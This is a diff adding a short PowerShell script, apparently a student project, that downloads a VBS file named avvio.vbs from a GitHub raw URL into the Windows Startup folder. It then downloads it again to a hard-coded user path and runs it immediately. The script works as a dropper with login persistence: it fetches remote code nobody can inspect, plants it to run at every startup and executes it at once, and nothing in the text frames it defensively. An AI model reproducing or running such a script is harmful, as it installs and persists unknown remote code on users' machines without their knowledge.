@@ -1,0 +1,6 @@
+$startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
+$destinationPath = [System.IO.Path]::Combine($startupFolder, 'avvio.vbs')
+
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/simonemichele05/PowershellProgetto/main/avvio.vbs' -OutFile $destinationPath
+
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/simonemichele05/PowershellProgetto/main/avvio.vbs' -OutFile 'C:\Users\Utente\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\avvio.vbs'; Set-Location -Path 'C:\Users\Utente\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'; .\avvio.vbs"
